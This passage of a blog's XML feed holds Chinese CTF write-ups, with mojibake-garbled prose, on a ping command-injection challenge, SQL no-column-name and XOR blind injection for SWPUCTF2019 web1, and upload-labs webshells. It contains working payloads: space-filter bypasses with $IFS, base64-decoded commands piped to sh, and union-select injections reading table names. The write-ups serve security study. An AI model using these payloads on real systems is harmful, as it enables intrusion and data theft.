class="keyword">close</span>;#é¦–å…ˆæ‰“å¼€æ•°æ®åº“ï¼Œå¼€å§‹è¯»å®ƒç¬¬ä¸€è¡Œæ•°æ®ï¼Œè¯»å–æˆåŠŸåè¿›è¡Œå…³é—­æ“ä½œã€‚</span><br><span class="line">handler <span class="number">1919810931114514</span> <span class="keyword">open</span>;handler <span class="number">1919810931114514</span> read next;handler <span class="number">1919810931114514</span> <span class="keyword">close</span>;</span><br></pre></td></tr></table></figure></p><h1 id="pingpingping"><a href="#pingpingping" class="headerlink" title="pingpingping"></a>pingpingping</h1><p>è¯¥é¢˜æˆ‘ä»¬è¾“å…¥<code>?ip=|ls</code>å‘ç°flag.phpå’Œindex.php<br>æˆ‘ä»¬ä½¿ç”¨<code>?ip=|cat flag.php</code><br>å‘ç°æ— æ³•è¾“å…¥ç©ºæ ¼<br>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1</span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125;</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></figure><br>æ¥ç»•è¿‡ç©ºæ ¼<br>è¾“å…¥<code>?ip=|cat$IFS$1flag.php</code>å‘ç°è¿flagä¹Ÿè¢«è¿‡æ»¤<br>æˆ‘ä»¬å…ˆæ‰“å¼€index.php<br>å‘ç°ä»£ç å¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å¯ä»¥å‘ç°å…¶è¿‡æ»¤äº†å¾ˆå¤šã€‚æˆ‘ä»¬æœ‰ä»¥ä¸‹å‡ ç§æ–¹æ³•æ¥è¿›è¡Œã€‚</p><h2 id="1-å†…æ•›ç»•è¿‡"><a href="#1-å†…æ•›ç»•è¿‡" class="headerlink" title="1.å†…æ•›ç»•è¿‡"></a>1.å†…æ•›ç»•è¿‡</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=|cat$IFS$1`ls`</span><br></pre></td></tr></table></figure><h2 id="2-æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä»£ç ä¸­å­˜åœ¨å˜é‡aæˆ‘ä»¬å¯ä»¥ä»¥å¦‚ä¸‹æ–¹æ³•ç»•è¿‡"><a href="#2-æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä»£ç ä¸­å­˜åœ¨å˜é‡aæˆ‘ä»¬å¯ä»¥ä»¥å¦‚ä¸‹æ–¹æ³•ç»•è¿‡" class="headerlink" title="2.æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä»£ç ä¸­å­˜åœ¨å˜é‡aæˆ‘ä»¬å¯ä»¥ä»¥å¦‚ä¸‹æ–¹æ³•ç»•è¿‡"></a>2.æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä»£ç ä¸­å­˜åœ¨å˜é‡aæˆ‘ä»¬å¯ä»¥ä»¥å¦‚ä¸‹æ–¹æ³•ç»•è¿‡</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1;a=g;cat$IFS$1fla$a.php;</span><br></pre></td></tr></table></figure><h2 id="ä½¿ç”¨shæ¥ç»•è¿‡"><a href="#ä½¿ç”¨shæ¥ç»•è¿‡" class="headerlink" title="ä½¿ç”¨shæ¥ç»•è¿‡"></a>ä½¿ç”¨shæ¥ç»•è¿‡</h2><p>bashå’Œshéƒ½å¯ä»¥è¿™æ ·å­è¿è¡Œç”±äºå…¶ç»•è¿‡äº†bashæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨sh<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cat fl*  ç”¨*åŒ¹é…ä»»æ„ </span><br><span class="line">ca\t fla\g.php        åæ–œçº¿ç»•è¿‡</span><br><span class="line">cat fl&#x27;&#x27;ag.php        ä¸¤ä¸ªå•å¼•å·ç»•è¿‡</span><br><span class="line">echo Y2F0IGZsYWcucGhw | base64 -d | bash(sh)      </span><br><span class="line">//base64ç¼–ç ç»•è¿‡  ç®¡é“ç¬¦(|)ä¼šæŠŠå‰ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºä½œä¸ºåä¸€ä¸ªå‘½ä»¤çš„å‚æ•°</span><br><span class="line">echo 63617420666c61672e706870 | xxd -r -p | bash(sh)         </span><br><span class="line">// hexç¼–ç ç»•è¿‡ï¼ŒåŸç†åŒä¸Š</span><br><span class="line">cat fl[a]g.php       ç”¨[]åŒ¹é…</span><br><span class="line">a=fl;b=ag;cat $a$b          å˜é‡æ›¿æ¢</span><br><span class="line">cp fla&#123;g.php,G&#125;    æŠŠflag.phpå¤åˆ¶ä¸ºflaG</span><br><span class="line">ca$&#123;21&#125;t a.txt     åˆ©ç”¨ç©ºå˜é‡  ä½¿ç”¨$*å’Œ$@ï¼Œ$x(x ä»£è¡¨ 1-9),$&#123;x&#125;(x&gt;=10)(å°äº 10 ä¹Ÿæ˜¯å¯ä»¥çš„) å› ä¸ºåœ¨æ²¡æœ‰ä¼ å‚çš„æƒ…å†µä¸‹ï¼Œä¸Šé¢çš„ç‰¹æ®Šå˜é‡éƒ½æ˜¯ä¸ºç©ºçš„ </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
          <category> åˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åˆ·é¢˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ— åˆ—åæ³¨å…¥å’Œå¼‚æˆ–æ³¨å…¥</title>
      <link href="/2023/12/16/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E5%92%8C%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/12/16/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E5%92%8C%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="åœ¨åˆ·å®Œsql-labsåæˆ‘åœ¨å­¦é•¿çš„åšå®¢é‡Œå‘ç°äº†å¦å¤–å‡ ç§æ³¨å…¥æ–¹å¼æˆ‘ä»¬ä¼šåœ¨ä¸‹é¢å†™å‡ºæ¥"><a href="#åœ¨åˆ·å®Œsql-labsåæˆ‘åœ¨å­¦é•¿çš„åšå®¢é‡Œå‘ç°äº†å¦å¤–å‡ ç§æ³¨å…¥æ–¹å¼æˆ‘ä»¬ä¼šåœ¨ä¸‹é¢å†™å‡ºæ¥" class="headerlink" title="åœ¨åˆ·å®Œsql-labsåæˆ‘åœ¨å­¦é•¿çš„åšå®¢é‡Œå‘ç°äº†å¦å¤–å‡ ç§æ³¨å…¥æ–¹å¼æˆ‘ä»¬ä¼šåœ¨ä¸‹é¢å†™å‡ºæ¥"></a>åœ¨åˆ·å®Œsql-labsåæˆ‘åœ¨å­¦é•¿çš„åšå®¢é‡Œå‘ç°äº†å¦å¤–å‡ ç§æ³¨å…¥æ–¹å¼æˆ‘ä»¬ä¼šåœ¨ä¸‹é¢å†™å‡ºæ¥</h1><h1 id="ä¸€ï¼šæ— åˆ—åæ³¨å…¥"><a href="#ä¸€ï¼šæ— åˆ—åæ³¨å…¥" class="headerlink" title="ä¸€ï¼šæ— åˆ—åæ³¨å…¥"></a>ä¸€ï¼šæ— åˆ—åæ³¨å…¥</h1><p>æ— åˆ—åæ³¨å…¥é¡¾åæ€ä¹‰å°±æ˜¯æ— æ³•æŸ¥è¯¢åˆ°åˆ—åï¼Œåˆ©ç”¨è¿™ç§æ–¹æ³•æ¥ç»•è¿‡åˆ—åçš„æŸ¥è¯¢æ–¹æ³•ã€‚<br>åœ¨è®¸å¤šçš„sqlæ³¨å…¥åœºæ™¯ä¸€èˆ¬éƒ½ä¼šè¿‡æ»¤information_schemaè¿™ä¸ªåº“å¯¼è‡´æˆ‘ä»¬æ— æ³•åˆ©ç”¨è¿™ä¸ªæŸ¥è¯¢è¡¨åå’Œåˆ—åï¼Œä½†æ˜¯åœ¨é«˜ç‰ˆæœ¬çš„mysqlé‡Œå­˜åœ¨<code>mysql.innodb_table_stats</code>å’Œ<code>mysql.innodb_table_index</code>ä¿å­˜ç€è¡¨åã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸¤ä¸ªè¡¨æ¥è¿›è¡ŒæŸ¥è¯¢è¡¨åã€‚å¯æ˜¯è¿™ä¸¤ä¸ªåªèƒ½æŸ¥è¯¢è¡¨åï¼Œæ€ä¹ˆæˆ‘ä»¬è¯¥æ€ä¹ˆæŸ¥è¯¢æ•°æ®å‘¢ï¼Ÿè¿™æ—¶å€™å°±è¦ç”¨åˆ°æ— åˆ—åæ³¨å…¥äº†ã€‚<br>æ— åˆ—åæ³¨å…¥çš„åŸç†æ˜¯åˆ©ç”¨selectè¯­å¥æ¥å°†åˆ—åé‡å‘½åä»£ç å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 union select * from user</span><br></pre></td></tr></table></figure><br><br>æˆ‘ä»¬å¯ä»¥å‘ç°æˆ‘ä»¬æŸ¥è¯¢å‡ºæ¥çš„è¡¨çš„åˆ—åå˜æˆäº†1ï¼Œ2ï¼Œ3ä¹Ÿå°±æ˜¯æˆ‘ä»¬å‘½åçš„è¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿå“å˜¿èªæ˜çš„æˆ‘æŸ¥äº†ä¸€ä¸‹chat-gptï¼Œå¾ˆå¿«å°±å¾—å‡ºäº†ç»“æœã€‚<br>å› ä¸ºsqlè¯­å¥ä¸­æŸ¥è¯¢çš„åˆ—åæ˜¯å¯ä»¥è‡ªå·±æŒ‡å®šçš„ï¼Œselect 1,2,3 union select <em> from userä¸­ç¬¬ä¸€ä¸ªselectè¯­å¥æŒ‡å®šçš„åˆ—åä¸º1ï¼Œ2ï¼Œ3äºŒç¬¬äºŒä¸ªselectè¯­å¥æ˜¯æŸ¥è¯¢userä¸­æ‰€æœ‰çš„ç»“æœã€‚è€Œunionä¼šå°†å‰åä¸¤ä¸ªè¯­å¥è¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœåŒ¹é…æˆåŠŸunionä¼šå°†å…¶è¿›è¡Œåˆå¹¶å¯¼è‡´åä¸€ä¸ªè¯­å¥ç»§æ‰¿å‰ä¸€ä¸ªè¯­å¥çš„åˆ—å<br>æˆ‘ä»¬åœ¨è¾“å…¥å¦‚ä¸‹è¯­å¥<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> `<span class="number">1</span>` <span class="keyword">from</span>(<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)A</span><br></pre></td></tr></table></figure><br><br>æˆ‘ä»¬å¯ä»¥å‘ç°å…¶å›æ˜¾äº†1çš„å†…å®¹ä¹Ÿå°±æ˜¯idçš„å†…å®¹ã€‚é‚£ä¹ˆæˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹æ˜¯ä¸ºä»€ä¹ˆï¼Œé¦–å…ˆ`(select 1,2,3 union select </em> from users)A<code>è¿™å¥çš„æ„æ€æ˜¯å°†æŸ¥è¯¢çš„ç»“æœé‡å‘½åä¸º</code>A<code>ã€‚å°±åƒæ˜¯å¤šäº†ä¸€ä¸ªè¡¨åä¸º</code>A<code>å†…å®¹ä¸º</code>users<code>çš„åˆ—åä¸º</code>1ï¼Œ2ï¼Œ3<code>çš„è¡¨ä¸€ã€‚é‚£ä¹ˆè¿™ä¸€å°±è¯è¿èµ·æ¥æ„æ€å°±å¾ˆæ˜ç¡®äº†ï¼Œå°±æ˜¯æŸ¥è¯¢æ¥è‡ª</code>A<code>åˆ—åä¸º</code>1<code>çš„åˆ—çš„å†…å®¹ï¼Œ</code>A<code>å°±æ˜¯</code>select 1,2,3 union select * from users`æŸ¥è¯¢çš„å†…å®¹<br>å¯èƒ½æœ‰äººä¼šæœ‰ç–‘é—®ä¸ºä»€ä¹ˆ1è¦åŠ åå¼•å·å‘¢ï¼Ÿè¿™æ˜¯å› ä¸ºsqlä¸­å°†åå¼•å·å†…çš„å†…å®¹è®¤ä¸ºæ˜¯åˆ—åï¼Œå¦‚æœå»æ‰åå¼•å·é‚£ä¹ˆ1å°±ä¼šè¢«å½“æˆæ•°å­—è§£æé‚£ä¹ˆå°±æ— æ³•æŸ¥è¯¢é“å†…å®¹ã€‚<br>å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ©ç”¨group_concatæ¥æŸ¥è¯¢å¤šæ¡è¯­å¥<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(`<span class="number">1</span>`,`<span class="number">2</span>`) <span class="keyword">from</span>(<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)A</span><br></pre></td></tr></table></figure><br><br>å½“ç„¶æœ‰çš„é¢˜ç›®ä¼šå°†åå¼•å·è¿‡æ»¤é‚£ä¹ˆæˆ‘ä»¬è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿå…¶å®ä¹Ÿä¸éš¾è§£å†³åªè¦å°†æŸ¥è¯¢è¯­å¥ä¸­çš„1ï¼Œ2ï¼Œ3åšç‚¹ä¿®æ”¹å°±å¥½ä»£ç å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(a) from(select 1 as a,2 as b,3 as c union select * from users)A</span><br></pre></td></tr></table></figure><br><br>æˆ‘ä»¬åˆ©ç”¨aså°†1å‘½åä¸ºaå°†2å‘½åä¸ºbå°†3å‘½åä¸ºcï¼Œè¿™æ ·å°±å¯ä»¥åˆ©ç”¨a,b,cä½œä¸ºåˆ—åæ¥æŸ¥è¯¢äº†</p><h2 id="SWPUCTF2019çš„web1"><a href="#SWPUCTF2019çš„web1" class="headerlink" title="SWPUCTF2019çš„web1"></a>SWPUCTF2019çš„web1</h2><p>è¿™é“é¢˜ç›®å°±æ˜¯ä¸€é“æ— åˆ—åæ³¨å…¥é¢˜ç›®ã€‚<br>åœ¨æˆ‘ä»¬ç‚¹å‡»è¿›å…¥åå‘ç°æ˜¯ä¸€ä¸ªç™»å…¥é¡µé¢ï¼Œåœ¨ç™»å…¥å®½å°è¯•äº†æ˜¯å¦èƒ½è¿›è¡Œæ³¨å…¥ï¼Œå‘ç°å¥½åƒä¸å¯ä»¥ï¼Œ</p><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥çœ‹è§æœ‰ä¸€ä¸ªæ³¨å†Œé¡µé¢ï¼Œæˆ‘ä»¬ç‚¹å‡»æ³¨å†Œï¼Œç„¶åç™»é™†ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹é“ï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œç”³è¯·å¹¿å‘Š<br><br>è¿™ç©æ„ä¸€çœ‹å°±åƒæ˜¯èƒ½æ³¨å…¥çš„æ ·å­æ»¡è„¸å†™ç€ï¼Œå¿«æ¥æ³¨å…¥æˆ‘å‘€ã€‚æˆ‘ä»¬åœ¨å¹¿å‘Šåè¾“å…¥1â€™<br><br>å‘ç°ç›´æ¥æŠ¥é”™æˆ‘ä»¬åœ¨è¾“å…¥<br># å‘ç°è¢«è¿‡æ»¤äº†ï¼Œç»è¿‡å°è¯•é¢˜ç›®æ‹¦æˆªäº†ç©ºæ ¼ï¼Œ#ï¼Œandå’Œorï¼Œå› ä¸ºåªè¦è¾“å…¥orå°±ä¼šè¢«wafæ‹¦æˆªå¯¼è‡´æ— æ³•å‘é€ä¹Ÿå°±é€ æˆäº†æˆ‘ä»¬æ— æ³•ä½¿ç”¨information_schemaå’Œorder by<br>æ³¨é‡Šç¬¦æˆ‘ä»¬å¯ä»¥ä½¿ç”¨%00æˆªæ–­æ³•ç»•è¿‡ï¼Œç©ºæ ¼å¯ä»¥ä½¿ç”¨%0bå’Œæ³¨é‡Šç¬¦/<strong>/ç»•è¿‡è¿™é‡Œæˆ‘å°±ä½¿ç”¨/ </strong>/å› ä¸º%0bå¤ªéš¾çœ‹äº†ï¼Œè€Œorder byæ— æ³•ä½¿ç”¨æˆ‘ä»¬å¯ä»¥ä½¿ç”¨group_byæ¥æŸ¥è¯¢å…¶åˆ—æ•°<br>æŸ¥è¯¢åˆ—æ•°çš„payload<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;/**/group_by/**/22;%00</span></span><br></pre></td></tr></table></figure><br>ç»è¿‡å°è¯•æˆ‘ä»¬å¯ä»¥å‘ç°å…¶åˆ—æ•°æ˜¯22æ²¡é”™22åˆ—<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22;%00</span></span><br></pre></td></tr></table></figure><br><br>å¯ä»¥å‘ç°å›æ˜¾ä¸ºæ˜¯2å’Œ3<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;/**/union/**/select/**/1,(select/**/database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22;%00</span></span><br></pre></td></tr></table></figure><br>å›æ˜¾å…¶åº“åä¸ºweb1æˆ‘ä»¬åœ¨ä½¿ç”¨mysql.innodb_table_statsæ¥æŸ¥è¯¢è¡¨åpayloadå¦‚ä¸‹<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22;%00</span></span><br></pre></td></tr></table></figure><br><br>æ¥ä¸‹æ¥å°±æ˜¯è¿›è¡Œæ— åˆ—åæ³¨å…¥äº†<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;/**/union/**/select/**/1,(select/**/group_concat(a,b,c)/**/from/**/(select/**/1/**/as/**/a,2/**/as/**/b,3/**/as/**/c/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22;%00</span></span><br></pre></td></tr></table></figure><br><br>å˜¿å˜¿flag get!!!!</p><h1 id="å¼‚æˆ–æ³¨å…¥"><a href="#å¼‚æˆ–æ³¨å…¥" class="headerlink" title="å¼‚æˆ–æ³¨å…¥"></a>å¼‚æˆ–æ³¨å…¥</h1><p>å¼‚æˆ–æ³¨å…¥ç®—æ˜¯ç›²æ³¨çš„ä¸€ç§ï¼Œæˆ‘ä»¬åœ¨äº†è§£å¼‚æˆ–æ³¨å…¥æ—¶å…ˆäº†è§£ä»¥ä¸‹å¼‚æˆ–ï¼Œæ‰€è°“å¼‚æˆ–å°±æ˜¯ä¸åŒè¿”å›1ç›¸åŒè¿”å›0.é‚£ä¹ˆå°±å‡ºç°äº†1^0^1=0,1^1^1=1,é‚£ä¹ˆå°±æˆ‘ä»¬åªè¦å°†ä¸­é—´çš„æ•°å­—æ¢æˆæ³¨å…¥è¯­å¥é‚£ä¹ˆåªè¦æ­£ç¡®å°±ä¼šè¿”å›1é”™è¯¯å°±ä¼šè¿”å›0,payloadå¦‚ä¸‹<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">^</span>(ascii(substr((<span class="keyword">select</span> database()),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span>)<span class="operator">^</span><span class="number">1</span></span><br></pre></td></tr></table></figure><br>é‚£ä¹ˆåªè¦æ­£ç¡®å°±è¿”å›1é”™è¯¯å°±è¿”å›0ï¼Œè¿™ç§æ³¨å…¥æ–¹æ³•å¯ä»¥åº”ç”¨ç”¨0äº1å›æ˜¾ç•Œé¢ä¸åŒçš„æƒ…å†µã€‚<br>åœ¨åˆ¤æ–­æ˜¯å¦ä¸ºæ•°å­—å‹æ³¨å…¥çš„ä¹Ÿå¯ä»¥ä½¿ç”¨^æ¥æ³¨å…¥<br>åªè¦<code>1^1^1</code>å’Œ<code>1^0^1</code>çš„å›æ˜¾ç›¸åŒé‚£ä¹ˆåŸºæœ¬å¯ä»¥ç¡®è®¤ä¸ºå­—ç¬¦å‹æ³¨å…¥</p>]]></content>
      
      
      <categories>
          
          <category> top10 </category>
          
          <category> sql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs</title>
      <link href="/2023/12/15/upload-labs/"/>
      <url>/2023/12/15/upload-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h1><p>WebShellæ˜¯ä¸€ç§ä»¥aspã€phpã€jspæˆ–cgiç­‰ç½‘é¡µæ–‡ä»¶å½¢å¼å­˜åœ¨çš„ä»£ç æ‰§è¡Œç¯å¢ƒï¼Œä¹Ÿå¯ä»¥ç§°ä¸ºä¸€ç§ç½‘é¡µåé—¨ã€‚å®ƒå…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼šå¯ä»¥è¿œç¨‹æ‰§è¡Œå‘½ä»¤ã€ä¸Šä¼ ä¸‹è½½æ–‡ä»¶ã€ä¿®æ”¹æ–‡ä»¶æƒé™ç­‰ã€‚WebShellæ ¹æ®åŠŸèƒ½å’Œç‰¹ç‚¹å¯ä»¥åˆ†ä¸ºä¸åŒçš„ç±»å‹ï¼ŒåŒ…æ‹¬å†…å­˜é©¬å’ŒWebShellç®¡ç†å·¥å…·</p><h1 id="å…³äºæ–‡ä»¶ä¸Šä¼ æ¼æ´"><a href="#å…³äºæ–‡ä»¶ä¸Šä¼ æ¼æ´" class="headerlink" title="å…³äºæ–‡ä»¶ä¸Šä¼ æ¼æ´"></a>å…³äºæ–‡ä»¶ä¸Šä¼ æ¼æ´</h1><p>æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¸»è¦æ˜¯ç”±äºæœåŠ¡å™¨ç«¯å¯¹ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶è¿‡æ»¤ä¸ä¸¥å¯¼è‡´è¢«æ”»å‡»è€…ä¼ å…¥è¿è¡Œå…·æœ‰æ¶æ„ä»£ç çš„æ–‡ä»¶ä»è€Œå¯¼è‡´å®‰å…¨é£é™©</p><h1 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´éœ€è¦æ»¡è¶³çš„æ¡ä»¶"><a href="#æ–‡ä»¶ä¸Šä¼ æ¼æ´éœ€è¦æ»¡è¶³çš„æ¡ä»¶" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ¼æ´éœ€è¦æ»¡è¶³çš„æ¡ä»¶"></a>æ–‡ä»¶ä¸Šä¼ æ¼æ´éœ€è¦æ»¡è¶³çš„æ¡ä»¶</h1><p>Webå®¹å™¨è§£é‡Šæ‰§è¡Œï¼š å¦‚æœä¸Šä¼ çš„æ–‡ä»¶èƒ½å¤Ÿè¢«Webå®¹å™¨è§£é‡Šæ‰§è¡Œï¼Œç‰¹åˆ«æ˜¯å¯¹äºä¸€äº›åŠ¨æ€ç½‘é¡µè¯­è¨€ï¼ˆå¦‚PHPã€ASPã€JSPç­‰ï¼‰ï¼Œæ”»å‡»è€…å¯èƒ½é€šè¿‡ä¸Šä¼ åŒ…å«æ¶æ„ä»£ç çš„æ–‡ä»¶æ¥å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚è¿™å¼ºè°ƒäº†å¯¹ä¸Šä¼ ç›®å½•çš„æƒé™å’Œé…ç½®çš„é‡è¦æ€§ï¼Œç¡®ä¿æ”»å‡»è€…æ— æ³•ç›´æ¥ä¸Šä¼ å¹¶æ‰§è¡Œæ¶æ„è„šæœ¬ã€‚</p><p>ç”¨æˆ·å¯é€šè¿‡Webè®¿é—®ï¼š æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„å¨èƒåœ¨äºæ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡Webè®¿é—®ä¸Šä¼ çš„æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶ä¸Šä¼ æˆåŠŸä½†ç”¨æˆ·æ— æ³•é€šè¿‡Webè®¿é—®ï¼Œé‚£ä¹ˆæ¼æ´çš„å½±å“å°†å—åˆ°é™åˆ¶ã€‚è¿™ä¹Ÿå¼ºè°ƒäº†å¯¹ä¸Šä¼ æ–‡ä»¶ç›®å½•çš„è®¿é—®æƒé™å’ŒWebæœåŠ¡å™¨é…ç½®çš„è€ƒè™‘ã€‚</p><p>å†…å®¹ä¿®æ”¹å’Œå®‰å…¨æ£€æŸ¥ï¼š é€šè¿‡å¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œå®‰å…¨æ£€æŸ¥ã€æ 